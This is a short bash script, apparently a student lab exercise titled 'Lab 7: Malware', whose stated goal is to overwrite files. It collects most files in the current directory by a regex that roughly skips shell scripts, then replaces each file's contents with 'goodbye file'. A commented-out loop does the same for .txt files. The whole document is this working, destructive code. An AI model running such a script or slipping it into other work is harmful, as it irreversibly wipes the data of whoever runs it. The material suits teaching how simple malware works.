#! /usr/bin/env bash

# Lab 7: Malware
# Goal: overwrite files

#test output
#ls | grep -E ".*\..*[^sh]$"

filearray=($(ls | grep -E ".*\..*[^sh]$"))
for key in ${!filearray[@]}
do
	echo "goodbye file" > ${filearray[$key]}
done


# works fine for txt files
#for filename in *.txt
#do
#	echo "goodbye file" > $filename
#done

